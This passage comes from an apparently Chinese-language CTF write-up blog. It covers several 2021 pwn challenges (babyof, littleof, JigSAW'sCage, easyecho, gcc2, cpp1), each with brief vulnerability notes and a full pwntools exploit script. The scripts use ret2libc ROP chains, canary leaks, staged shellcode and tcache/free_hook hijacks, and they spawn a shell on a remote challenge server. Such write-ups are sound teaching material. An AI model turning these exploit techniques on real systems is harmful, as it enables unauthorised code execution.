class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-鹤城杯-babyof"><a class="header-anchor" href="#2021-鹤城杯-babyof">¶</a>[2021 鹤城杯]babyof</h2>
<h3 id="题目考点-v5"><a class="header-anchor" href="#题目考点-v5">¶</a>题目考点</h3>
<pre><code>ret2libc
</code></pre>
<h3 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h3>
<p>buf处存在栈溢出</p>
<h3 id="exp-v10"><a class="header-anchor" href="#exp-v10">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28073</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400743</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x40066B</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="number">0x00000000001b3e1a</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) +  p64(ret) +p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-鹤城杯-littleof"><a class="header-anchor" href="#2021-鹤城杯-littleof">¶</a>[2021 鹤城杯]littleof</h2>
<h3 id="题目考点-v6"><a class="header-anchor" href="#题目考点-v6">¶</a>题目考点</h3>
<pre><code>ret2libc
canary
</code></pre>
<h3 id="题目分析-v4"><a class="header-anchor" href="#题目分析-v4">¶</a>题目分析</h3>
<p>题目存在canary</p>
<p><img src="http://static.zybuluo.com/hgggg/bv44ppcn4yc9olz9cynvwj7p/1.jpg" alt="1.jpg-7.4kB"><br>
<img src="http://static.zybuluo.com/hgggg/qun6tu6uu3anokwgsiox0jt0/image_1fhpqrsetl1s19a1ipo1qf8s05l.png" alt="image_1fhpqrsetl1s19a1ipo1qf8s05l.png-4kB"></p>
<p>通过IDA分析可以得到canary的位置在距buf的0x48处，即只要padding0x48个字节就能得到canary剩下的就是基操了</p>
<h3 id="exp-v11"><a class="header-anchor" href="#exp-v11">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;littleof&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28147</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;littleof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040059e</span></span><br><span class="line">pop_rdi =<span class="number">0x0000000000400863</span></span><br><span class="line">main = <span class="number">0x4006E2</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">canary = canary &amp; <span class="number">0XFFFFFFFFFFFFFFF0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">binsh = libc_base + <span class="number">0x00000000001b3e1a</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">canary = canary &amp; <span class="number">0XFFFFFFFFFFFFFFF0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) +p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-祥云杯-JigSAW’sCage"><a class="header-anchor" href="#2021-祥云杯-JigSAW’sCage">¶</a>[2021 祥云杯]JigSAW’sCage</h2>
<h3 id="题目考点-v7"><a class="header-anchor" href="#题目考点-v7">¶</a>题目考点</h3>
<pre><code>1.shellcode
2.整数溢出
</code></pre>
<h3 id="IDA-分析-v3"><a class="header-anchor" href="#IDA-分析-v3">¶</a>IDA 分析</h3>
<p>漏洞函数<br>
<img src="http://static.zybuluo.com/hgggg/oq0e413lm3nlmpbt5ivwjrrk/2.png" alt="2.png-53kB"></p>
<p>虽然程序保护全开，但是漏洞函数中当条件满足时（利用整数溢出）会调用mprotect函数且prot的值为7,即对qword_5148+1024赋予RWX权限</p>
<p><img src="http://static.zybuluo.com/hgggg/bvqbnd4eyq3g6wlo6n6uf8nx/3.png" alt="3.png-10.8kB"><br>
而qwor_5148又在heap处，故我们申请的堆块就有着RWX权限，所以可以向堆块中写入shellcode</p>
<p>难点就在于edit函数只能一次写入0x10个字节，所以shellcode需要分段写入，在写入的过程中要不断调整rsp</p>
<p>最后利用给出的test函数来执行shellcode</p>
<h3 id="EXP-v4"><a class="header-anchor" href="#EXP-v4">¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./JigSAW&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28001</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;iNput:&quot;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">s1 = asm(<span class="string">&quot;mov rsp, rdx\nadd rsp, 0x20\npush rsp&quot;</span>)</span><br><span class="line">s2 = asm(<span class="string">&quot;mov rax, 0x68732f6e69622f\nadd rsp, 0x20\npush rsp&quot;</span>)</span><br><span class="line">s3 = asm(<span class="string">&quot;push rax\nmov rdi, rsp\nxor rsi, rsi\nadd rsp, 0x28\npush rsp&quot;</span>)</span><br><span class="line">s4 = asm(<span class="string">&quot;xor rdx, rdx\nmov rax, 59\nsyscall\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s2))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s3))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s4))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Name:&quot;</span>, <span class="string">&quot;hgg&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">0x1</span>&lt;&lt;<span class="number">32</span>))  <span class="comment">#int len overlap</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,s1)</span><br><span class="line">edit(<span class="number">1</span>, s2)</span><br><span class="line">edit(<span class="number">2</span>, s3)</span><br><span class="line">edit(<span class="number">3</span>, s4)</span><br><span class="line">test(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="2021-鹤城杯-easyecho"><a class="header-anchor" href="#2021-鹤城杯-easyecho">¶</a>[2021 鹤城杯]easyecho</h2>
<h3 id="题目考点-v8"><a class="header-anchor" href="#题目考点-v8">¶</a>题目考点</h3>
<pre><code>stack smashing
</code></pre>
<h3 id="解题思路-v2"><a class="header-anchor" href="#解题思路-v2">¶</a>解题思路</h3>
<p>Step1:输入name时溢出，计算程序地址</p>
<p>Step2:输入backdoor 将flag读到栈上</p>
<p>Step3: 利用gets(v10)stack smashing</p>
<p>计算偏移<br>
<img src="http://static.zybuluo.com/hgggg/nyvv849arksxe3hzswduykjb/4.png" alt="4.png-382.9kB"></p>
<h3 id="EXP-v5"><a class="header-anchor" href="#EXP-v5">¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&quot;./easyecho&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Name: &quot;</span>,<span class="string">&quot;A&quot;</span>*<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome AAAAAAAAAAAAAAAA&quot;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">pie_base=leak-<span class="number">0xcf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak&quot;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">flag_addr=pie_base+<span class="number">0x202040</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,<span class="built_in">hex</span>(flag_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;backdoor&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x168</span>+p64(flag_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;exitexit&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="2021-东华杯-gcc2"><a class="header-anchor" href="#2021-东华杯-gcc2">¶</a>[2021 东华杯]gcc2</h2>
<h3 id="题目考点-v9"><a class="header-anchor" href="#题目考点-v9">¶</a>题目考点</h3>
<pre><code>1.UAF
2.tcache bin attack
</code></pre>
<h3 id="题目分析-v5"><a class="header-anchor" href="#题目分析-v5">¶</a>题目分析</h3>
<p>漏洞点在free函数,存在UAF</p>
<p><img src="http://static.zybuluo.com/hgggg/ccgw4efnbb2aicw8r9lhzp5e/image_1fjndvfu82bh5khmn7frn1q139.png" alt="image_1fjndvfu82bh5khmn7frn1q139.png-57.7kB"></p>
<p>add 函数限制了堆块申请个数以及最大申请的大小</p>
<p><img src="http://static.zybuluo.com/hgggg/8u2ek8dyl20mhghuvbtl7cxq/image_1fjne1tamlao1plmh0sas12hbm.png" alt="image_1fjne1tamlao1plmh0sas12hbm.png-79.2kB"></p>
<p>解题思路比较简单，利用UAF想办法构造一个大块释放近unsorted bin泄露出libc然后打free_hook</p>
<h3 id="解题步骤-v4"><a class="header-anchor" href="#解题步骤-v4">¶</a>解题步骤</h3>
<p>Step1:利用UAF构造一个大于0x410的块，释放进入unsorted bin得到libc地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  add(i, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># double free 泄露堆地址</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">edit(<span class="number">10</span>, p64(heap_addr-<span class="number">0x470</span>)+p64(<span class="number">0</span>))   <span class="comment">#将chunk10的fd指针改写成chunk0的地址</span></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">12</span>, p64(<span class="number">0</span>)+<span class="string">b&#x27;\x81\x04&#x27;</span>)         <span class="comment">#修改chunk0的size位</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>Step2: 劫持free_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a class="header-anchor" href="#完整exp">¶</a>完整exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;gcc2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28017</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  add(i, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">edit(<span class="number">10</span>, p64(heap_addr-<span class="number">0x470</span>)+p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">12</span>, p64(<span class="number">0</span>)+<span class="string">b&#x27;\x81\x04&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-东华杯-cpp1"><a class="header-anchor" href="#2021-东华杯-cpp1">¶</a>[2021 东华杯]cpp1</h2>
<h3 id="题目考点-v10"><a class="header-anchor" href="#题目考点-v10">¶</a>题目考点</h3>
<pre><code>1.overlapping
2.tcache bin attack
</code></pre>
<h3 id="题目分析-v6"><a class="header-anchor" href="#题目分析-v6">¶</a>题目分析</h3>
<p>漏洞点在edit函数,存在溢出</p>
<p><img src="http://static.zybuluo.com/hgggg/jq3bhsmvh7hzm8750ph2vjll/image_1fjpn0gt2s2a1aml2mo1pugvir9.png" alt="image_1fjpn0gt2s2a1aml2mo1pugvir9.png-59kB"></p>
<p>add 函数限制了堆块申请个数以及最大申请的大小</p>
<p><img src="http://static.zybuluo.com/hgggg/95dvpw16ig0zpq2f2lx4zv34/image_1fjpn1b1p8vn9fpgna1l1o6rm.png" alt="image_1fjpn1b1p8vn9fpgna1l1o6rm.png-78.9kB"></p>
<p>解题思路比较简单，利用chunk overlapping 泄露出libc 然后打free_hook</p>
<h3 id="解题步骤-v5"><a class="header-anchor" href="#解题步骤-v5">¶</a>解题步骤</h3>
<p>Step1：填满tcache,利用edit中的溢出修改size制造overlapped chunk，释放进入unsorted bin得到libc地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>)  </span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xb8</span>) </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x38</span>)</span><br><span class="line"><span class="comment"># 因为chunk0-6的size位为0x101,所以我们修改chunk8的size位为0x101，使得chunk8和chunk9合并</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x01\x01&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment"># 释放chunk8进入unsorted bin</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># 将原本的chunk8恢复，此时chunk9的fd指针指向main_arena_xx</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x38</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) -<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>Step2: 劫持free_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(system))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<h3 id="完整exp-v2"><a class="header-anchor" href="#完整exp-v2">¶</a>完整exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;cpp1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28139</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 